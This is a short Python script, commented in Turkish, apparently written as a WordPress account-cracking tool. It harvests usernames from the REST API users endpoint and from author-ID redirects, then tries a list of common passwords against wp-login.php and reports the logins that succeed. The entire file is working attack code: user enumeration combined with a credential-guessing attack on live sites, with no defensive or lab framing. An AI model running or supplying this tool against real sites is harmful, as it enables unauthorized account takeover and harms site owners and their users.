import requests
import re

class WPUserPasswordFinder:
    def __init__(self, url, common_passwords=None):
        """WordPress kullanıcı ve şifre tarayıcı"""
        self.url = url.rstrip('/')
        self.users = []
        self.passwords = common_passwords or [
            "admin", "123456", "password", "12345678", "qwerty", "abc123"
        ]

    def find_users_rest_api(self):
        """WordPress REST API üzerinden kullanıcı adlarını bulur"""
        rest_url = f"{self.url}/wp-json/wp/v2/users"
        try:
            response = requests.get(rest_url, timeout=5)
            if response.status_code == 200:
                users = [user["name"] for user in response.json()]
                self.users.extend(users)
        except requests.exceptions.RequestException:
            pass

    def find_users_by_author_id(self):
        """Yazar ID'si ile kullanıcı adlarını tespit eder"""
        for i in range(1, 6):  # İlk 5 ID'yi deniyoruz
            author_url = f"{self.url}/?author={i}"
            try:
                response = requests.get(author_url, timeout=5)
                match = re.search(r"/author/([a-zA-Z0-9_-]+)/", response.text)
                if match:
                    self.users.append(match.group(1))
            except requests.exceptions.RequestException:
                pass

    def check_common_passwords(self):
        """Bulunan kullanıcı adları için yaygın şifreleri test eder"""
        valid_credentials = []
        login_url = f"{self.url}/wp-login.php"

        for user in self.users:
            for pwd in self.passwords:
                data = {
                    'log': user,
                    'pwd': pwd,
                    'wp-submit': 'Log In',
                    'redirect_to': self.url,
                    'testcookie': '1'
                }
                try:
                    session = requests.Session()
                    response = session.post(login_url, data=data, timeout=5)
                    
                    if "dashboard" in response.url or "wp-admin" in response.url:
                        valid_credentials.append((user, pwd))
                        break  # Başarılı giriş olursa şifre denemeyi bırak
                except requests.exceptions.RequestException:
                    pass

        return valid_credentials

    def run(self):
        """Tüm kullanıcı adlarını ve şifreleri kontrol eder"""
        self.find_users_rest_api()
        self.find_users_by_author_id()
        found_passwords = self.check_common_passwords()

        return {
            "users": list(set(self.users)),  # Tekrar eden kullanıcıları temizle
            "valid_logins": found_passwords
        }